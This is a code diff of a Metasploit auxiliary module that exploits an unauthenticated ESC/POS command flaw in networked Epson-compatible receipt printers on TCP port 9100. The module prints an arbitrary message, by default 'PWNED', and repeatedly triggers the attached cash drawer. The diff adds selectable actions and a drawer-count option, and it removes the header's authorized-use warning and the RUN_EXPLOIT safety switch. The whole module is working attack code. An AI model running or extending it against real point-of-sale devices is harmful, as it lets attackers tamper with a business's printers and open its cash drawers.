@@ -1,19 +1,3 @@
-# encoding: utf-8
-#
-# Escpos TCP Command Injector for networked Epson-compatible printers
-#
-# This module exploits an unauthenticated ESC/POS command vulnerability in networked receipt printers.
-#
-# Example usage:
-#   use auxiliary/scanner/printer/escpos_tcp_command_injector
-#   set RHOST 192.168.1.100
-#   set MESSAGE "Test"
-#   run
-#
-# WARNING: Only use this module on printers you are authorized to test.
-#
-require 'msf/core'
-
 class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::Tcp
 
@@ -21,24 +5,29 @@ class MetasploitModule < Msf::Auxiliary
     super(update_info(info,
       'Name'        => 'ESC/POS Printer Command Injector',
       'Description' => %q{
-        This module demonstrates an unauthenticated ESC/POS command vulnerability in networked Epson-compatible printers (CVE submitted). 
-        By default, it prints "PWNED" (or a custom MESSAGE).
-        You can also optionally trigger the cash drawer.
+        This module exploits an unauthenticated ESC/POS command vulnerability in networked Epson-compatible printers.
+        You can print a custom message, trigger the attached cash drawer, or do both.
       },
       'Author'      => ['FutileSkills'],
       'License'     => MSF_LICENSE,
       'References'  => [
         ['URL', 'https://github.com/futileskills/Security-Advisory']
-      ]
+      ],
+      'Actions'     =>
+        [
+          ['PRINT', { 'Description' => 'Print a message to the printer' }],
+          ['DRAWER', { 'Description' => 'Trigger the attached cash drawer' }],
+          ['BOTH', { 'Description' => 'Print and trigger the drawer' }]
+        ],
+      'DefaultAction' => 'PRINT'
     ))
 
     register_options(
       [
-        Opt::RHOST(),                                      # Target IP
         Opt::RPORT(9100),                                  # Default printer port
         OptString.new('MESSAGE', [true, 'Message to print', 'PWNED']),
-        OptBool.new('RUN_EXPLOIT', [true, 'Whether to actually send commands to the printer', true]),
-        OptBool.new('TRIGGER_DRAWER', [false, 'Whether to trigger the attached cash drawer', false])
+        OptBool.new('TRIGGER_DRAWER', [false, 'Trigger the attached cash drawer', false]),
+        OptInt.new('DRAWER_COUNT', [true, 'Number of times to trigger the drawer', 2])
       ]
     )
   end
@@ -49,43 +38,48 @@ class MetasploitModule < Msf::Auxiliary
   def run
     rhost_ip = rhost
     message = datastore['MESSAGE']
-    run_exploit = datastore['RUN_EXPLOIT']
     trigger_drawer = datastore['TRIGGER_DRAWER']
+    drawer_count = datastore['DRAWER_COUNT'].to_i.clamp(1, 10)  # Clamp for safety
 
-    if run_exploit
-      # ESC/POS print commands: initialize, center, double-size font for message, reset alignment, cut
-      # "\x1b\x40"      => Initialize printer
-      # "\x1b\x61\x01"  => Center alignment
-      # "\x1d\x21\x11"  => Double-size font
-      # "#{message}"    => User-provided message
-      # "\x1d\x21\x00"  => Reset font
-      # "\n\x1b\x61\x00\n\n" => Left alignment and extra newlines
-      # "\x1d\x56\x42"  => Cut paper
-      print_commands = "\x1b\x40\x1b\x61\x01\x1d\x21\x11#{message}\x1d\x21\x00\n\x1b\x61\x00\n\n\x1d\x56\x42"
-
-      begin
-        print_status("Sending print message to #{rhost_ip}...")
-        connect
-        sock.put(print_commands)
-        disconnect
-
-        # Optionally trigger the drawer (send twice with short delay)
-        if trigger_drawer
-          2.times do
-            connect
-            sock.put(DRAWER_COMMAND)
-            disconnect
-            sleep(0.5)
-          end
-          print_status("Triggered cash drawer on #{rhost_ip}")
-        end
-
-        print_good("Finished sending commands to #{rhost_ip}")
-      rescue ::Rex::ConnectionError
-        print_error("Failed to connect to #{rhost_ip}")
-      end
+    case action.name
+    when 'PRINT'
+      send_print(rhost_ip, message)
+    when 'DRAWER'
+      send_drawer(rhost_ip, drawer_count)
+    when 'BOTH'
+      send_print(rhost_ip, message)
+      send_drawer(rhost_ip, drawer_count)
     else
-      print_status("RUN_EXPLOIT is false; skipping sending commands to #{rhost_ip}")
+      print_error("Unknown action: #{action.name}")
     end
+  end
+
+  def send_print(rhost_ip, message)
+    print_commands = "\x1b\x40\x1b\x61\x01\x1d\x21\x11#{message}\x1d\x21\x00\n\x1b\x61\x00\n\n\x1d\x56\x42"
+    print_status("Sending print message to #{rhost_ip}...")
+    begin
+      connect
+      sock.put(print_commands)
+      disconnect
+      print_good("Printed message to #{rhost_ip}")
+    rescue ::Rex::ConnectionError
+      print_error("Failed to connect to #{rhost_ip} for printing")
+    end
+  end
+
+  def send_drawer(rhost_ip, count)
+    print_status("Triggering cash drawer #{count} times on #{rhost_ip}...")
+    count.times do
+      begin
+        connect
+        sock.put(DRAWER_COMMAND)
+        disconnect
+        sleep(0.5)
+      rescue ::Rex::ConnectionError
+        print_error("Failed to connect to #{rhost_ip} for drawer trigger")
+        break
+      end
+    end
+    print_good("Triggered cash drawer on #{rhost_ip}")
   end
 end
